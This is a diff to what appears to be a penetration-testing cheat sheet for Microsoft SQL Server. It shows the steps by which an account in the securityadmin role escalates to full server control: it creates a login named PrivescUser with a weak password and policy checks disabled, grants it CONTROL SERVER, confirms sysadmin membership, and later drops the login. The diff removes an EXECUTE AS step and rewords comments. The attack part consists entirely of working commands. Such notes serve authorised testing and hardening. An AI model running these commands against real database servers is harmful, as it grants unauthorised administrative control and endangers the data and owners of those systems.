@@ -1015,16 +1015,17 @@ SQL> SELECT name FROM master..syslogins WHERE securityadmin = 1;
 scenario: the account 'WIN-F820SQBBVJR\pentester' is member of the 'securityadmin' group
 
 C:\> SQLCMD -U patrolsvc -s WIN-F820SQBBVJR
-C:\> EXECUTE AS LOGIN = 'WIN-F820SQBBVJR\monitoring';
 	SQL> USE master
 	SQL> GO
 	SQL> CREATE LOGIN PrivescUser WITH PASSWORD=N'Welcome1', DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;
 	SQL> GO
 	SQL> GRANT CONTROL SERVER TO PrivescUser;
 	SQL> GO
-	-- Login as PrivescUser with sqlcmd or dbvis
-	SQL> SELECT * FROM  fn_my_permissions(NULL, 'DATABASE'); 
-	SQL> SELECT name FROM master..syslogins WHERE sysadmin = 1;	
+	
+	-- Then Log into the DB as PrivescUser with sqlcmd or dbvis... you are now 'dba'
+	SQL> SELECT name FROM master..syslogins WHERE sysadmin = 1;
+	
+	-- Command To delete the PivescUser
 	SQL> DROP LOGIN PrivescUser;
 
 	
